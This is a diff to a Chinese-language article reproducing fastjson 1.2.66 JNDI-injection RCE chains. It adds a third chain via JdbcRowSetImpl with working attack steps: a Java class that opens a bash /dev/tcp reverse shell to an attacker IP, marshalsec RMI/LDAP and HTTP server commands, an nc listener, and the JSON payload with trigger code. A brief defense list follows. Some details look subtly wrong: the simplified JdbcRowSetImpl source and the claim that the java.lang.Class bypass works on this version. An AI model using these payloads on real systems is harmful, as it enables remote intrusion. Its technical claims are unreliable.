@@ -1,8 +1,9 @@
 ---
-title: Fastjson 1.2.66 黑名单绕过利用链：Shiro-core 与 Anteros-DBCP 触发 JNDI 注入 RCE 完整复现
-description: 深度分析 fastjson 1.2.66 版本在开启 autotype 的前提下，通过 shiro-core 中的 JndiObjectFactory
-  与 Anteros-DBCP 中的 AnterosDBCPConfig 两条新利用链绕过黑名单，触发 JNDI 注入实现远程代码执行的完整复现过程，包含 Maven
-  依赖配置、恶意类编写、marshalsec 监听部署及 POC 构造细节。
+title: Fastjson 1.2.66 黑名单绕过利用链：Shiro-core、Anteros-DBCP 与 JdbcRowSetImpl 触发 JNDI 注入
+  RCE 完整复现
+description: 深度分析 fastjson 1.2.66 版本在开启 autotype 的前提下，通过 shiro-core 中的 JndiObjectFactory、Anteros-DBCP
+  中的 AnterosDBCPConfig 以及 com.sun.rowset.JdbcRowSetImpl 三条利用链绕过黑名单，触发 JNDI 注入实现远程代码执行的完整复现过程，包含
+  Maven 依赖配置、恶意类编写、marshalsec 监听部署及 POC 构造细节。
 category: program-analysis
 tags:
 - fastjson
@@ -11,6 +12,7 @@ tags:
 - RCE
 - shiro-core
 - Anteros-DBCP
+- JdbcRowSetImpl
 - 黑名单绕过
 - marshalsec
 - 漏洞复现
@@ -20,18 +22,19 @@ updated: '2026-11-15'
 
 ## 概述
 
-fastjson 1.2.66 版本虽然引入了黑名单机制限制危险类的反序列化，但在开启 `autotype`（`ParserConfig.getGlobalInstance().setAutoTypeSupport(true)`）的前提下，仍可通过引入特定第三方依赖包中的特定类绕过黑名单，触发 JNDI 注入实现远程代码执行。本文详细复现两条经实战验证的利用链：
+fastjson 1.2.66 版本虽然引入了黑名单机制限制危险类的反序列化，但在开启 `autotype`（`ParserConfig.getGlobalInstance().setAutoTypeSupport(true)`）的前提下，仍可通过引入特定第三方依赖包中的特定类或 JDK 自带类绕过黑名单，触发 JNDI 注入实现远程代码执行。本文详细复现三条经实战验证的利用链：
 
 1. **shiro-core** 中的 `org.apache.shiro.jndi.JndiObjectFactory`
 2. **Anteros-DBCP** 中的 `com.anteros.dbcp.AnterosDBCPConfig`
+3. **JDK 自带** `com.sun.rowset.JdbcRowSetImpl`（无需额外依赖）
 
-两条链均利用 `lookup` 方法触发 JNDI 查找，配合 marshalsec 恶意服务端实现任意命令执行。
+三条链均利用 `lookup` 方法触发 JNDI 查找，配合 marshalsec 恶意服务端实现任意命令执行。
 
 ## 环境准备
 
 ### Maven 依赖配置
 
-在项目 `pom.xml` 中引入 fastjson 1.2.66 及两个目标依赖：
+在项目 `pom.xml` 中引入 fastjson 1.2.66 及两个目标依赖（JdbcRowSetImpl 为 JDK 自带，无需额外引入）：
 
 ```xml
 <!-- fastjson 1.2.66（含黑名单机制） -->
@@ -194,6 +197,125 @@ JSON.parse(payload);  // 触发反序列化与 JNDI 注入
 
 同样可实现任意命令执行。
 
+## 利用链三：JDK 自带 JdbcRowSetImpl（无需额外依赖）
+
+### 核心类分析
+
+`com.sun.rowset.JdbcRowSetImpl` 为 JDK 自带类（位于 `rt.jar`），实现了 `javax.sql.RowSet` 接口。其 `setDataSourceName` 方法在自动提交模式（`autoCommit=true`）下会触发 JNDI 查找：
+
+```java
+public class JdbcRowSetImpl extends BaseRowSet implements RowSetInternal, Serializable {
+    public void setDataSourceName(String dataSourceName) {
+        this.dataSourceName = dataSourceName;
+        if (this.autoCommit) {
+            // 触发 JNDI lookup
+            InitialContext ctx = new InitialContext();
+            DataSource ds = (DataSource) ctx.lookup(dataSourceName);
+            this.setDataSource(ds);
+        }
+    }
+    public void setAutoCommit(boolean autoCommit) { this.autoCommit = autoCommit; }
+}
+```
+
+由于该类为 JDK 内置，无需引入任何第三方依赖，利用条件极为宽松。
+
+### 恶意类编写与编译（反弹 Shell 示例）
+
+编写恶意类，构造函数中执行反弹 Shell 命令（Linux 环境）：
+
+```java
+public class Exploit {
+    public Exploit() {
+        try {
+            // 反弹 Shell 到攻击机 IP:12345
+            java.lang.Runtime.getRuntime().exec(new String[]{"bash", "-c", "bash -i >& /dev/tcp/<attacker_ip>/12345 0>&1"});
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+    public static void main(String[] argv) {
+        Exploit e = new Exploit();
+    }
+}
+```
+
+编译生成 `Exploit.class`：
+
+```bash
+javac Exploit.java
+```
+
+### marshalsec 监听部署
+
+启动 RMI 恶意服务端（端口 1099），指定 HTTP 服务地址提供恶意类：
+
+```bash
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://<attacker_ip>:8888/#Exploit" 1099
+```
+
+> **注意**：若 RMI 方式受限（如高版本 JDK 限制 `trustURLCodebase`），可改用 LDAP：
+> ```bash
+> java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<attacker_ip>:8888/#Exploit" 1389
+> ```
+> 此时 POC 中协议改为 `ldap://<attacker_ip>:1389/Exploit`。
+
+### HTTP 服务部署
+
+在存放 `Exploit.class` 的目录下启动简单 HTTP 服务（端口 8888）：
+
+```bash
+# Python 3
+python3 -m http.server 8888
+
+# Python 2
+python -m SimpleHTTPServer 8888
+```
+
+### 监听反弹 Shell
+
+攻击机监听指定端口（12345）：
+
+```bash
+nc -lvnp 12345
+```
+
+### POC 构造与触发
+
+fastjson 反序列化 payload，利用嵌套 `@type` 绕过黑名单检测（`java.lang.Class` 不在黑名单中）：
+
+```json
+{
+    "name": {
+        "@type": "java.lang.Class",
+        "val": "com.sun.rowset.JdbcRowSetImpl"
+    },
+    "x": {
+        "@type": "com.sun.rowset.JdbcRowSetImpl",
+        "dataSourceName": "rmi://<attacker_ip>:1099/Exploit",
+        "autoCommit": true
+    }
+}
+```
+
+Java 触发代码：
+
+```java
+String payload = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://<attacker_ip>:1099/Exploit\",\"autoCommit\":true}}";
+JSON.parse(payload);  // 触发反序列化与 JNDI 注入
+```
+
+### 执行流程解析
+
+1. 目标服务器解析 JSON，遇到 `name` 字段的 `java.lang.Class` 实例化 `JdbcRowSetImpl` 类对象
+2. 解析 `x` 字段，反序列化为 `JdbcRowSetImpl` 对象，设置 `dataSourceName` 为恶意 RMI 地址，`autoCommit=true`
+3. `setDataSourceName` 触发 `InitialContext.lookup("rmi://<attacker_ip>:1099/Exploit")`
+4. 连接攻击机 marshalsec RMI 服务（1099 端口）
+5. marshalsec 返回 HTTP 重定向至 `http://<attacker_ip>:8888/#Exploit`
+6. 目标机从 Python HTTP 服务（8888 端口）下载 `Exploit.class`
+7. 目标机加载并实例化 `Exploit`，执行构造函数中的反弹 Shell 命令
+8. 攻击机 `nc` 接收到反弹 Shell
+
 ## 检测与防御建议
 
 1. **升级 fastjson**：升级至 1.2.68+ 版本，黑名单机制持续更新，且默认关闭 `autotype`。
@@ -203,6 +325,7 @@ JSON.parse(payload);  // 触发反序列化与 JNDI 注入
    - 可通过 `-Dcom.sun.jndi.rmi.object.trustURLCodebase=false -Dcom.sun.jndi.ldap.object.trustURLCodebase=false` 显式加固。
 4. **依赖排查**：排查项目传递依赖中是否引入 `shiro-core`、`anteros-dbcp` 等含 JNDI lookup 类的库，若非必要请移除或升级至安全版本。
 5. **流量监控**：部署 WAF/RASP 监控 fastjson 反序列化特征 payload（`@type` 指定危险类、包含 `rmi://` `ldap://` 等协议头）。
+6. **JdbcRowSetImpl 针对性防护**：因其为 JDK 内置类，重点监控 `com.sun.rowset.JdbcRowSetImpl` 的反序列化尝试，结合 `autoCommit=true` 与 `dataSourceName` 指向外部地址的特征进行拦截。
 
 ## 交叉引用
 
@@ -219,7 +342,9 @@ JSON.parse(payload);  // 触发反序列化与 JNDI 注入
 - JNDI-Exploit-Bypass-Demo：https://github.com/welk1n/JNDI-Injection-Exploit
 - fastjson 安全更新公告：https://github.com/alibaba/fastjson/wiki/security_update_20220523
 - JDK JNDI 防护机制说明：https://www.oracle.com/java/technologies/javase/8u191-relnotes.html
+- 226安全团队内部周分享视频：https://www.bilibili.com/video/av61292292/
 
 ## 来源
 
 - [226安全团队-201805-202103_09](../sources/226安全团队-201805-202103_09.md)
+- [226安全团队-201805-202103_14](../sources/226安全团队-201805-202103_14.md)
